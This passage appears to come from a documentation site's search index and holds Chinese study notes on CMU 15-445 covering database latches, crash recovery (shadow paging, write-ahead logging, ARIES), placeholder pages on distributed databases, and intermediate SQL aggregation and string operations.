\u8fdb\u884c\u7ba1\u7406\uff0c\u5e76\u4e14\u5f00\u9500\u5f88\u5927\uff0c\u4e0d\u8fc7\u4f18\u70b9\u5728\u4e8e\u5176\u4f7f\u7528\u7b80\u5355\uff0c\u4e0d\u9700\u8981\u5728 DBMS \u4e2d\u989d\u5916\u7f16\u7801\u3002</p> <p>Test-and-Set Spin Latch, TAS</p> <p>\u76f8\u8f83\u4e8e OS Mutex\uff0c\u7531 DBMS \u63a7\u5236\u7684 Spin Latch \u662f\u66f4\u6709\u6548\u7684\u65b9\u6848\u3002</p> <p>\u4e00\u4e2a Spin Latch \u5b9e\u8d28\u4e0a\u662f\u5185\u5b58\u4e2d\u7684\u4e00\u4e2a\u4f4d\u7f6e\uff0c\u5b83\u53ef\u4ee5\u88ab\u7ebf\u7a0b\u4fee\u6539\u503c\uff08\u901a\u5e38\u662f\u5e03\u5c14\u503c\uff09\u3002DBMS \u53ef\u4ee5\u63a7\u5236\u5728\u65e0\u6cd5\u83b7\u53d6 Latch \u65f6\u4f1a\u53d1\u751f\u4ec0\u4e48\uff0c\u5b83\u53ef\u4ee5\u9009\u62e9\u5faa\u73af\u91cd\u8bd5\u6216\u8005\u5141\u8bb8 OS \u53d6\u6d88\u5b83\u3002</p> <p>\u56e0\u6b64\uff0c\u8fd9\u79cd\u65b9\u6848\u4e3a DBMS \u63d0\u4f9b\u4e86\u66f4\u591a\u63a7\u5236\u6743\uff0c\u5bf9 Latch \u7684\u63a7\u5236\u4e5f\u66f4\u9ad8\u6548\u3002\u7f3a\u70b9\u662f\u4e0d\u53ef\u62d3\u5c55\u4ee5\u53ca\u5bf9\u7f13\u5b58\u4e0d\u53cb\u597d\u3002</p> <p>Reader-Writer Latch</p> <p>Mutex \u548c Spin Latch \u4e0d\u533a\u5206\u8bfb\u5199\uff0c\u800c Reader-Writer Latch \u5141\u8bb8\u5c06 Latch \u4fdd\u6301\u5728\u8bfb/\u5199\u6a21\u5f0f\u3002\u5b83\u8ddf\u8e2a\u4e24\u79cd\u6a21\u5f0f\u4e0b\u6709\u591a\u5c11\u7ebf\u7a0b\u6301\u6709 Latch \u4ee5\u53ca\u6b63\u5728\u7b49\u5728\u83b7\u53d6 Latch\u3002</p> <p>Reader-Writer Latch \u4f7f\u7528\u524d\u9762\u4e24\u79cd Latch \u5b9e\u73b0\u4e4b\u4e00\u4f5c\u4e3a\u57fa\u7840\uff0c\u5e76\u5177\u6709\u989d\u5916\u903b\u8f91\u6765\u5904\u7406 Reader-Writer Queues\u3002\u4e0d\u540c\u7684 DBMS \u6709\u4e0d\u540c\u7684\u7b56\u7565\u6765\u5904\u7406\u8be5\u961f\u5217\u3002\u4f18\u70b9\u5728\u4e8e\u5141\u8bb8\u5e76\u53d1\u8bfb\u53d6\uff0c\u7f3a\u70b9\u662f\u9700\u8981\u989d\u5916\u7684\u5f00\u9500\u7ba1\u7406 Reader-Writer Queue \u4ee5\u53ca\u5143\u6570\u636e\u3002</p>"},{"location":"Accumulation/CMU15-445/Data%20Structures/#hash-table-latching","title":"Hash Table Latching","text":""},{"location":"Accumulation/CMU15-445/Data%20Structures/#b-tree-latching","title":"B+ Tree Latching","text":"<p>https://15445.courses.cs.cmu.edu/fall2022/notes/09-indexconcurrency.pd</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/","title":"9. Database Crash","text":""},{"location":"Accumulation/CMU15-445/Database%20Crash/#9-database-crash","title":"9. Database Crash","text":"<p> \u7ea6 1476 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#crash-recovery","title":"Crash Recovery","text":"<p>Recovery Algorithm \u662f\u786e\u4fdd\u6570\u636e\u5e93\u4e00\u81f4\u6027\u3001\u539f\u5b50\u6027\u548c\u6301\u4e45\u6027\u7684\u6280\u672f\u3002\u5f53\u4e00\u4e2a Crash \u53d1\u751f\u65f6\uff0c\u6240\u6709\u672a\u63d0\u4ea4\u5230\u78c1\u76d8\u5185\u7684\u6570\u636e\u90fd\u6709\u4e22\u5931\u7684\u98ce\u9669\uff0c\u6062\u590d\u7b97\u6cd5\u65e8\u5728\u5d29\u6e83\u540e\u963b\u6b62\u4fe1\u606f\u4e22\u5931\u3002</p> <p>\u6240\u6709 Recovery Algorithm \u90fd\u6709\u4e24\u90e8\u5206\uff1a</p> <ul> <li>&lt;1&gt; \u4e8b\u52a1\u6b63\u5e38\u8fd0\u884c\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c</li> <li>&lt;2&gt; \u53d1\u751f\u5d29\u6e83\u540e\u6062\u590d\u6570\u636e\u5e93\u5230\u80fd\u786e\u4fdd\u4e00\u81f4\u6027\u3001\u539f\u5b50\u6027\u548c\u6301\u4e45\u6027\u7684\u72b6\u6001\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c</li> </ul> <p>Key Primitives \u57fa\u672c\u64cd\u4f5c</p> <ul> <li>UNDO: \u79fb\u9664\u4e00\u4e2a\u4e0d\u5b8c\u6574\u6216\u662f\u5df2\u4e2d\u6b62\u4e8b\u52a1\u7684\u5f71\u54cd\u7684\u8fc7\u7a0b</li> <li>REDO: \u91cd\u65b0\u5e94\u7528\u5df2\u63d0\u4ea4\u4e8b\u52a1\u7684\u6548\u679c\u7684\u8fc7\u7a0b</li> </ul>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#failure-classification","title":"Failure Classification","text":"<p>DBMS \u6839\u636e\u5e95\u5c42\u5b58\u50a8\u8bbe\u5907\u4e0d\u540c\u800c\u88ab\u5206\u4e3a\u4e0d\u540c\u7ec4\u4ef6\uff0c\u76f8\u5e94\u9700\u8981\u5904\u7406\u591a\u79cd\u4e0d\u540c\u7c7b\u578b\u7684\u6545\u969c\u3002\u5176\u4e2d\u4e00\u4e9b\u6545\u969c\u53ef\u4ee5\u6062\u590d\uff0c\u4e00\u4e9b\u5219\u4e0d\u80fd\u3002</p> <p>Type 1: Transaction Failures</p> <p>\u53ef\u80fd\u5bfc\u81f4\u4e8b\u52a1\u5931\u8d25\u7684\u4e24\u7c7b\u9519\u8bef\u662f\u903b\u8f91\u9519\u8bef\u548c\u5185\u90e8\u72b6\u6001\u9519\u8bef\uff1a</p> <ul> <li>Logical Errors: \u7531\u4e8e\u67d0\u4e9b\u5185\u90e8\u9519\u8bef(\u4f8b\u5982\u5b8c\u6574\u6027\u3001\u7ea6\u675f)\uff0c\u4e8b\u52a1\u65e0\u6cd5\u5b8c\u6210</li> <li>Internal State Errors: \u56e0\u4e3a\u67d0\u4e9b\u9519\u8bef\u6761\u4ef6(\u4f8b\u5982 Deadlock)\uff0cDBMS \u5fc5\u987b\u4e2d\u6b62\u8be5\u4e8b\u52a1</li> </ul> <p>Type 2: System Failures</p> <p>\u7cfb\u7edf\u6545\u969c\u662f\u652f\u6491\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u7684\u5e95\u5c42\u8f6f\u786c\u4ef6\u4e2d\u7684\u610f\u5916\u6545\u969c\uff0c\u8fd9\u4e9b\u6545\u969c\u5fc5\u987b\u5728 Crash Recovery Protocol \u4e2d\u5f97\u5230\u8003\u8651\u3002</p> <ul> <li>Software Failure: DBMS \u5b9e\u73b0\u51fa\u73b0\u95ee\u9898(\u4f8b\u5982\u672a\u6355\u83b7\u7684\u96640\u5f02\u5e38)\uff0c\u7cfb\u7edf\u5fc5\u987b\u505c\u6b62</li> <li>Hardware Failure: \u6258\u7ba1 DBMS \u7684\u8ba1\u7b97\u673a\u5d29\u6e83(\u4f8b\u5982\u7535\u6e90\u4e2d\u65ad)<ul> <li>\u6211\u4eec\u5047\u8bbe\u975e\u6613\u5931\u6027\u5b58\u50a8\u4ecb\u8d28\u7684\u5185\u5bb9\u4e0d\u4f1a\u88ab\u7cfb\u7edf\u5d29\u6e83\u635f\u574f\uff0c\u8fd9\u88ab\u79f0\u4e3a Fail-Stop \u5047\u8bbe\uff0c\u7b80\u5316\u4e86\u6062\u590d\u8fc7\u7a0b</li> </ul> </li> </ul> <p>Type 3: Storage Media Failure</p> <p>\u5b58\u50a8\u4ecb\u8d28\u6545\u969c\u662f\u6307\u7269\u7406\u5b58\u50a8\u8bbe\u5907\u635f\u574f\u65f6\u53d1\u751f\u7684\u4e0d\u53ef\u4fee\u590d\u6545\u969c\u3002</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#buffer-pool-management-policies","title":"Buffer Pool Management Policies","text":"<p>DBMS \u7684 Steal Policy \u51b3\u5b9a\u4e86\u662f\u5426\u5141\u8bb8\u672a\u63d0\u4ea4\u7684\u4e8b\u52a1\u8986\u76d6\u975e\u6613\u5931\u6027\u5b58\u50a8\u4e2d\u7684\u5df2\u63d0\u4ea4\u503c\uff1a</p> <ul> <li>STEAL: \u5141\u8bb8</li> <li>NO-STEAL: \u4e0d\u5141\u8bb8</li> </ul> <p>DBMS \u7684 Force Policy \u51b3\u5b9a\u4e86\u4e8b\u52a1\u5728\u63d0\u4ea4\u4e4b\u524d\uff0c\u662f\u5426\u9700\u8981\u5c06\u4e8b\u52a1\u6240\u505a\u7684\u6240\u6709\u66f4\u65b0\u53cd\u6620\u5230\u975e\u6613\u5931\u6027\u5b58\u50a8\u4e2d\uff1a</p> <ul> <li>FORCE: \u5fc5\u9700</li> <li>NO-FORCE: \u975e\u5fc5\u9700</li> </ul> <p>\u5f3a\u5236\u5199\u5165\u4f7f\u5f97\u6062\u590d\u66f4\u52a0\u5bb9\u6613\uff0c\u56e0\u4e3a\u6240\u6709\u66f4\u6539\u90fd\u5f97\u5230\u4fdd\u7559\uff0c\u4f46\u4f1a\u5bfc\u81f4\u66f4\u5dee\u7684\u6027\u80fd</p> <p>NO-STEAL + FORCE \u662f\u6700\u5bb9\u6613\u5b9e\u73b0\u7684\u7f13\u51b2\u6c60\u7ba1\u7406\u7b56\u7565\u3002\u5728\u6b64\u7b56\u7565\u4e2d\uff0cDBMS \u65e0\u9700\u64a4\u9500\u5df2\u4e2d\u6b62\u4e8b\u52a1\u7684\u4fee\u6539\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u66f4\u6539\u5c1a\u672a\u5199\u5165\u78c1\u76d8\u3002\u5b83\u4e5f\u65e0\u9700\u91cd\u505a\u5df2\u63d0\u4ea4\u4e8b\u52a1\u7684\u66f4\u6539\uff0c\u56e0\u4e3a\u6240\u6709\u66f4\u6539\u90fd\u4fdd\u8bc1\u5728\u63d0\u4ea4\u65f6\u5199\u5165\u78c1\u76d8\u3002</p> <p>\u4e0d\u8fc7\uff0c\u8be5\u7b56\u7565\u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u6240\u6709\u4fee\u6539\u6570\u636e\u5fc5\u987b\u80fd\u653e\u7684\u8fdb\u5185\u5b58\u4e2d\uff0c\u5426\u5219\u4e8b\u52a1\u65e0\u6cd5\u6267\u884c\uff0c\u56e0\u4e3a DBMS \u4e0d\u5141\u8bb8\u5728\u4e8b\u52a1\u63d0\u4ea4\u524d\u5c06\u810f\u9875\u5199\u5165\u78c1\u76d8\u3002</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#shadow-paging","title":"Shadow Paging","text":"<p>Shadow Paging \u662f\u5bf9\u4e4b\u524d\u65b9\u6848\u7684\u6539\u8fdb\uff0cDBMS \u5728\u5199\u5165 Page \u65f6\u989d\u5916\u590d\u5236\u4e00\u4efd\uff0c\u4ee5\u7ef4\u62a4\u6570\u636e\u5e93\u7684\u4e24\u4e2a\u72ec\u7acb\u7248\u672c\uff1a</p> <ul> <li>master: \u4ec5\u5305\u542b\u5df2\u63d0\u4ea4\u4e8b\u52a1\u7684\u66f4\u6539</li> <li>shadow: \u4e34\u65f6\u6570\u636e\u5e93\uff0c\u5305\u542b\u672a\u63d0\u4ea4\u4e8b\u52a1\u7684\u66f4\u6539</li> </ul> <p>\u66f4\u6539\u4ec5\u5728 shadow \u4e2d\u8fdb\u884c\uff0c\u5f53\u4e00\u4e2a\u4e8b\u52a1\u63d0\u4ea4\u65f6\uff0cshadow \u539f\u5b50\u6027\u5730\u53d8\u6210 master\uff0c\u800c\u65e7\u7684 master \u6700\u7ec8\u4f1a\u88ab Garbage Collected\u3002</p> <p>Shadow Paging \u7684\u4e00\u4e2a\u7f3a\u70b9\u662f\u590d\u5236\u6574\u4e2a Page Table \u4ee3\u4ef7\u9ad8\u6602\u3002\u5b9e\u9645\u4e0a\uff0c\u6211\u4eec\u53ea\u9700\u8981\u590d\u5236\u66f4\u65b0\u8fc7\u7684\u53f6\u8282\u70b9\u8def\u5f84\uff0c\u800c\u4e0d\u662f\u6574\u4e2a\u6811\u3002\u53e6\u4e00\u4e2a\u95ee\u9898\u662f\uff0c\u8fd9\u53ea\u80fd\u652f\u6301\u53ea\u6709\u4e00\u4e2a Writer \u7684\u4e00\u7ec4\u4e8b\u52a1\u6216\u8005\u6279\u91cf\u4e8b\u52a1\u3002</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#write-ahead-logging","title":"Write-Ahead Logging","text":"<p>\u4f7f\u7528 Write-Ahead Logging\uff0c\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u5728\u5c06\u66f4\u6539\u5199\u5165 Disk Page \u524d\uff0c\u4f1a\u5c06\u6570\u636e\u5e93\u7684\u6240\u6709\u66f4\u6539\u8bb0\u5f55\u5728\u4e00\u4e2a Logging File \u4e2d\u3002\u65e5\u5fd7\u4e2d\u5305\u542b\u8db3\u591f\u6267\u884c\u5fc5\u8981\u64a4\u9500\u4ee5\u53ca REDO \u64cd\u4f5c\u7684\u4fe1\u606f\uff0c\u5d29\u6e83\u540e\u5c06\u6839\u636e\u65e5\u5fd7\u6062\u590d\u6570\u636e\u5e93\u3002</p> <p>Logging File \u4f4d\u4e8e Stable Storage \u4e2d</p> <p>WAL \u5c5e\u4e8e STEAL + NO-FORCE \u7684\u7cfb\u7edf\uff1a</p> <p></p> <p>versus Shadow Paging</p> <p>\u5728 Shadow Paging \u4e2d\uff0cDBMS \u9700\u8981\u5bf9\u78c1\u76d8\u4e0a\u968f\u673a\u975e\u8fde\u7eed\u9875\u9762\u8fdb\u884c\u5199\u64cd\u4f5c\u3002\u800c Write-Ahead Logging \u5219\u5c06\u968f\u673a\u5199\u8f6c\u6362\u6210\u987a\u5e8f\u5199\uff0c\u5177\u6709\u66f4\u597d\u7684\u6027\u80fd\uff0c\u8fd9\u4e5f\u662f\u51e0\u4e4e\u6bcf\u4e2a DBMS \u90fd\u4f7f\u7528 WAL \u7684\u539f\u56e0\u3002\u4f46\u662f WAL \u7684\u6062\u590d\u65f6\u95f4\u6bd4 Shadow Paging \u6162\uff0c\u56e0\u4e3a\u5b83\u5fc5\u987b Replay Log\u3002</p> <p>\u6bcf\u6761\u65e5\u5fd7\u6761\u76ee\u90fd\u5305\u62ec\u91cd\u653e\u5355\u4e2a\u5bf9\u8c61\u66f4\u6539\u6240\u9700\u7684\u4fe1\u606f\uff1a</p> <ul> <li>Transaction ID</li> <li>Object ID</li> <li>Before Value (for <code>UNDO</code>)</li> <li>After Value (for <code>REDO</code>)</li> </ul> <p>DBMS \u5fc5\u987b\u5728\u5411\u5916\u754c\u8868\u660e\u4e8b\u52a1\u5df2\u63d0\u4ea4\u4e4b\u524d\uff0c\u5c06\u4e8b\u52a1\u7684\u6240\u6709\u65e5\u5fd7\u6761\u76ee\u5199\u5165\u78c1\u76d8\u3002\u7cfb\u7edf\u53ef\u4ee5\u4f7f\u7528\u5206\u7ec4\u63d0\u4ea4\u7684\u65b9\u5f0f\u6765\u4f18\u5316\u591a\u65e5\u5fd7\u6279\u5904\u7406\u3002</p> <p>\u5728 Log-Structured DBMS \u4e2d\uff0c\u4e8b\u52a1\u7684 log \u4f1a\u88ab\u5199\u5165\u540d\u4e3a MemTable \u7684\u5185\u5b58\u7f13\u51b2\u533a\uff0c\u5f53\u8fd9\u4e2a\u7f13\u51b2\u533a\u6ee1\u540e\uff0c\u5185\u5bb9\u4f1a\u88ab\u5237\u65b0\u5230\u78c1\u76d8\u4e0a\u3002\u4f46\u5b83\u4ecd\u7136\u9700\u8981\u4e00\u4e2a\u72ec\u7acb\u7684 Write-Ahead Log\uff0c\u8fd9\u662f\u56e0\u4e3a WAL \u7684\u5237\u65b0\u9891\u7387\u901a\u5e38\u6bd4 MemTable \u9ad8\uff0c\u5e76\u4e14 WAL \u53ef\u7528\u4e8e\u5d29\u6e83\u540e\u6062\u590d MemTable \u7684\u5185\u5bb9\u3002</p>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#logging-schemes","title":"Logging Schemes","text":"<p>Log \u8bb0\u5f55\u7684\u5185\u5bb9\u6839\u636e\u5b9e\u73b0\u65b9\u5f0f\u4e5f\u6709\u6240\u4e0d\u540c\uff1a</p> <ul> <li>Physical Logging: <ul> <li>\u8bb0\u5f55\u6570\u636e\u5e93\u7279\u5b9a\u4f4d\u7f6e\u7684 Byte-Level Change</li> </ul> </li> <li>Logical Logging:<ul> <li>\u8bb0\u5f55\u4e8b\u52a1\u6267\u884c\u7684 High Level Operations</li> <li>\u76f8\u6bd4\u4e8e Physical Logging\uff0c\u6bcf\u4e2a\u65e5\u5fd7\u8bb0\u5f55\u5199\u5165\u6570\u636e\u66f4\u5c11\uff0c\u56e0\u4e3a\u6bcf\u4e2a\u8bb0\u5f55\u53ef\u4ee5\u66f4\u65b0\u591a\u4e2a Page \u4e2d\u7684\u591a\u4e2a\u5143\u7ec4\u3002\u4f46\u662f\u8fd9\u4e2a\u65b9\u6848\u5728\u975e\u786e\u5b9a\u6027\u5e76\u53d1\u63a7\u5236\u65b9\u6848\u4e2d\u96be\u4ee5\u5b9e\u73b0\u6062\u590d\u6548\u679c\u3002</li> </ul> </li> <li>PhysioLogical Logging:<ul> <li>\u6df7\u5408\u65b9\u6cd5\uff0c\u6839\u636e Slot Number \u8bc6\u522b\u5143\u7ec4\u800c\u4e0d\u662f\u5176\u5177\u4f53\u4f4d\u7f6e\u3002\u56e0\u6b64\uff0c\u5728\u65e5\u5fd7\u5199\u5165\u78c1\u76d8\u540e\uff0cDBMS \u53ef\u4ee5\u91cd\u65b0\u7ec4\u7ec7 Page</li> <li>\u6700\u5e38\u7528\u7684\u5b9e\u73b0\u65b9\u5f0f</li> </ul> </li> </ul>"},{"location":"Accumulation/CMU15-445/Database%20Crash/#aries","title":"ARIES","text":"<p>Algorithms for Recovery and Isolation Exploiting Semantics \u662f IBM \u4e3a DB2 \u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u79cd\u6062\u590d\u7b97\u6cd5\uff0cARIES \u534f\u8bae\u6709\u4ee5\u4e0b\u4e09\u4e2a\u5173\u952e\u6982\u5ff5\uff1a</p> <ul> <li>Write-Ahead Logging: \u4efb\u4f55\u66f4\u6539\u5728\u5199\u5165\u78c1\u76d8\u524d\u5148\u5199\u5165\u7a33\u5b9a\u5b58\u50a8\u7684\u65e5\u5fd7\u4e2d</li> <li>Repeating History During Redo: \u91cd\u542f\u65f6\uff0c\u56de\u6eaf\u64cd\u4f5c\u5e76\u6062\u590d\u6570\u636e\u5e93\u5230\u5d29\u6e83\u524d\u7684\u72b6\u6001</li> <li>Logging Changes During Undo: \u8bb0\u5f55 undo \u64cd\u4f5c\uff0c\u4ee5\u786e\u4fdd\u91cd\u590d\u5931\u8d25\u60c5\u51b5\u4e0b\u64cd\u4f5c\u4e0d\u4f1a\u91cd\u590d\u6267\u884c</li> </ul> <p>\u8fd9\u91cc\u4e5f\u6446\u4e86</p>"},{"location":"Accumulation/CMU15-445/Distributed%20Database/","title":"10. Distributed Database","text":""},{"location":"Accumulation/CMU15-445/Distributed%20Database/#10-distributed-database","title":"10. Distributed Database","text":"<p> \u7ea6 18 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4\u4e0d\u5230 1 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Distributed%20Database/#introduction","title":"Introduction","text":"<p>TBD</p>"},{"location":"Accumulation/CMU15-445/Distributed%20Database/#distributed-oltp-database-systems","title":"Distributed OLTP Database Systems","text":"<p>TBD</p>"},{"location":"Accumulation/CMU15-445/Distributed%20Database/#distributed-olap-database-systems","title":"Distributed OLAP Database Systems","text":"<p>TBD</p>"},{"location":"Accumulation/CMU15-445/Distributed%20Database/#embedded-database-logic","title":"Embedded Database Logic","text":"<p>TBD</p>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/","title":"2. Intermediate SQL","text":""},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#2-sql","title":"2. \u4e2d\u7ea7 SQL","text":"<p> \u7ea6 1097 \u4e2a\u5b57  80 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#_1","title":"\u7b80\u4ecb","text":"<p>SQL(Sequel)\u662f\u4e00\u4e2a\u8bed\u8a00\u89c4\u8303\uff0c\u6700\u521d\u7531 IBM \u8bbe\u8ba1\u3002\u4e0d\u8fc7\u5f88\u591a DBMS \u5e76\u4e0d\u4f1a\u5b8c\u5168\u6309\u7167\u89c4\u8303\u8bbe\u8ba1\u5b83\u4eec\u7684\u8bed\u8a00\uff0c\u6bcf\u4e2a\u4eba\u90fd\u60f3\u8981\u5c06\u5b83\u4eec\u7684 feature \u52a0\u5165 SQL \u540e\u7eed\u7684\u66f4\u65b0\u4e2d\u3002</p> <p>\u4f5c\u4e3a\u4e00\u4e2a\u5173\u7cfb\u578b\u8bed\u8a00\uff0cSQL \u7531\u4ee5\u4e0b\u4e09\u4e2a\u65b9\u9762\u7ec4\u5408\u800c\u6210\uff1a</p> <ul> <li>Data Manipulation Language (DML)<ul> <li>\u6570\u636e\u64cd\u4f5c\u8bed\u8a00\uff0c\u5373\u68c0\u7d22\u6570\u636e\u6216\u4fee\u6539\u6570\u636e\u7684\u547d\u4ee4</li> </ul> </li> <li>Data Defination Language (DDL)<ul> <li>\u6570\u636e\u5b9a\u4e49\u8bed\u8a00\uff0c\u53ef\u6d89\u53ca\u5230\u7d22\u5f15\u3001\u547d\u540d\u7a7a\u95f4\u3001\u89e6\u53d1\u5668\u3001\u51fd\u6570\u7b49\uff0c\u901a\u5e38\u4e3a\u6570\u636e\u5e93\u58f0\u660e\u5143\u6570\u636e</li> </ul> </li> <li>Data Control Language (DCL)<ul> <li>\u6570\u636e\u63a7\u5236\u8bed\u8a00\uff0c\u5173\u4e8e\u5b89\u5168\u548c\u7c7b\u4f3c\u5185\u5bb9\u7684\u89c4\u8303</li> </ul> </li> </ul> <p>SQL \u57fa\u672c\u7684\u6570\u636e\u7ed3\u6784\u662f bag\uff0c\u5b83\u7c7b\u4f3c\u4e8e\u4e00\u4e2a\u6ca1\u6709\u987a\u5e8f\u7684\u96c6\u5408\uff0c\u4f46\u662f\u5141\u8bb8\u91cd\u590d\u5143\u7d20\u51fa\u73b0</p>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#aggregrations-group-by","title":"Aggregrations + Group By","text":"<p>\u805a\u5408(Aggregrations)\u4ece a bag of tuples \u4e2d\u8fd4\u56de\u5355\u4e2a\u503c\uff1a</p> <ul> <li>AVG(col)</li> <li>MIN(col)</li> <li>MAX(col)</li> <li>SUM(col)</li> <li>COUNT(col)</li> <li>AND SO ON...</li> </ul> <p>\u4f8b\u5982\uff0c\u6211\u4eec\u60f3\u8981\u67e5\u8be2\u5b66\u6821\u4e00\u5171\u6709\u591a\u5c11\u5b66\u751f\u662f\u4ee5 CS \u4e13\u4e1a\u6ce8\u518c\u7684\uff0c\u53ef\u4ee5\u4f7f\u7528\uff1a</p> <pre><code>SELECT COUNT(login) AS cnt FROM student WHERE login LIKE \"%@CS\"\n\n-- \u4e8b\u5b9e\u4e0a\uff0c\u8fd9\u91cc COUNT(login) \u6362\u6210 COUNT(*) \u751a\u81f3 COUNT(1) \u6548\u679c\u90fd\u662f\u4e00\u6837\u7684\n</code></pre> <p>\u8fd9\u91cc\u662f\u9009\u53d6\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5f62\u5f0f\uff0c\u627e\u51fa\u6240\u6709\u4ee5 <code>@CS</code> \u7ed3\u5c3e\u7684\u5b66\u751f</p> <p>\u5f53\u6211\u4eec\u5e0c\u671b\u67e5\u8be2\u8ba1\u7b97\u5404\u4e2a\u8bfe\u7a0b\u5185\u7684\u5b66\u751f\u7684\u5e73\u5747 GPA \u65f6\uff0c\u8fd8\u9700\u8981\u989d\u5916\u4f7f\u7528 <code>GROUP BY</code> \u6765\u6307\u5b9a\uff1a</p> <pre><code>SELECT AVG(s.gpa), e.cid\nFROM enrolled AS e, student AS s\nWHERE e.sid = s.sid\nGROUP BY e.cid\n</code></pre> <p>\u8fd9\u5c06\u5148\u901a\u8fc7\u8bfe\u7a0b ID \u5c06\u6bcf\u4e2a\u8bfe\u7a0b\u5206\u7ec4\uff0c\u7136\u540e\u518d\u8ba1\u7b97\u8be5\u8bfe\u7a0b\u5185\u6240\u6709\u5b66\u751f GPA \u7684\u5e73\u5747\u3002</p> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5982\u679c\u4f60\u8fd8\u60f3\u5728 SELECT \u540e\u518d\u52a0\u4e0a <code>s.name</code>\uff0c\u8fd9\u4e00\u822c\u662f\u4e0d\u88ab\u5141\u8bb8\u7684</p> <p>\u5728\u6b64\u57fa\u7840\u4e0a\uff0c\u5982\u679c\u53ea\u60f3\u8f93\u51fa\u5b66\u751f\u5e73\u5747 GPA \u5728 3.9 \u4ee5\u4e0a\u7684\u8bfe\u7a0b\uff0c\u4f60\u4e0d\u80fd\u4f7f\u7528\u4ee5\u4e0b\u505a\u6cd5\uff1a</p> <pre><code>SELECT AVG(s.gpa) AS avg_gpa, e.cid\nFROM enrolled AS e, student AS s\nWHERE e.sid = s.sid\nAND avg_gpa &gt; 3.9\nGROUP BY e.cid\n</code></pre> <p>\u56e0\u4e3a\u5728\u67e5\u8be2\u7684\u65f6\u5019\u5e73\u5747\u503c\u8fd8\u6ca1\u6709\u8ba1\u7b97\u51fa\u6765\u3002\u6b64\u65f6\u5e94\u8be5\u6539\u7528 <code>having</code> \u5173\u952e\u5b57\uff0c\u6765\u5728\u805a\u5408\u4e4b\u540e\u8f93\u51fa\u6307\u5b9a\u5185\u5bb9\uff1a</p> <pre><code>SELECT AVG(s.gpa) AS avg_gpa, e.cid\nFROM enrolled AS e, student AS s\nWHERE e.sid = s.sid\nGROUP BY e.cid\nHAVING avg_gpa &gt; 3.9\n\n-- \u4e00\u4e9b DBMS \u4e2d\u8be5\u53e5\u4e0d\u8d77\u4f5c\u7528\uff0c\u5e94\u5f53\u4fee\u6539\u4e3a\uff1a\n-- HAVING AVG(s.gpa) &gt; 3.9\n-- \u5b9e\u9645\u4e0a\uff0cAVG \u5e76\u4e0d\u4f1a\u8ba1\u7b97\u4e24\u6b21\n</code></pre>"},{"location":"Accumulation/CMU15-445/Intermediate%20SQL/#stringdatetime-operations","title":"String/Date/Time Operations","text":"<p>\u6b63\u5982\u4e4b\u524d\u6240\u8bf4\u7684\u90a3\u6837\uff0cDBMS \u53ef\u80fd\u5e76\u4e0d\u4f1a\u5b8c\u5168\u9075\u5faa SQL \u8bbe\u8ba1\uff0c\u56e0\u6b64\u5bf9\u4e8e\u5b57\u7b26\u4e32\u5224\u5b9a\u7b49\u4e8b\u5b9c\uff0c\u5c31\u53ef\u80fd\u4ea7\u751f\u4e0d\u4e00\u6837\u7684\u6548\u679c\u3002\u8fd9\u4e5f\u5bfc\u81f4\u4e86\u4e0d\u540c\u7ba1\u7406\u7cfb\u7edf\u4e4b\u95f4\u4e0d\u80fd\u8fdb\u884c\u7b80\u5355\u79fb\u690d\u3002</p> <p>\u4f8b\u5982\uff0c<code>SQL-92</code> \u5bf9\u5b57\u7b26\u4e32\u5927\u5c0f\u5199\u654f\u611f\uff0c\u4e14\u8981\u6c42\u7528\u5355\u5f15\u53f7\u5305\u56f4\u5b57\u7b26\u4e32\uff1b\u800c <code>MySQL</code> \u5219\u5bf9\u5b57\u7b26\u4e32\u5927\u5c0f\u5199\u4e0d\u654f\u611f\uff0c\u5e76\u4e14\u65e2\u53ef\u4ee5\u7528\u5355\u5f15\u53f7\u53c8\u53ef\u4ee5\u7528\u53cc\u5f15\u53f7\uff1a</p> <pre><code>WHERE UPPER(name) = UPPER('KaNyE')  -- SQL-92\nWHERE name = \"KaNyE\"                -- MySQL\n</code></pre> <p>\u5bf9\u4e8e\u5b57\u7b26\u4e32\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>LIKE</code> \u5173\u952e\u5b57\u8fdb\u884c string matching\uff1a</p> <ul> <li><code>%</code> \u53d6\u4ee3\u4efb\u610f\u957f\u5ea6\u7684 substring\uff08\u5305\u62ec\u7a7a\u5b57\u7b26\u4e32\uff09</li> <li><code>_</code> \u53d6\u4ee3\u5355\u4e2a\u5b57\u7b26</li> </ul> <p>SQL \u6807\u51c6\u8981\u6c42\u4f7f\u7528 <code>||</code> \u6765\u8fdb\u884c\u5b57\u7b26\u4e32\u7684\u8fde\u63a5\uff0c\u4f46\u8fd9\u4e2a\u4e5f\u5728\u4e0d\u540c DBMS \u4e2d\u6709\u8f83\u5927\u533a\u522b\uff1a</p> <pre><code>WHERE login = LOWER(name) || '@cs'       -- SQL-92\nWHERE login = LOWER(name) + '@cs'        -- SQL Server\nWHERE login = CONCAT(LOWER(name), '@cs') -- MySQL\n</code></pre> <p>\u5bf9\u4e8e DATE/TIME 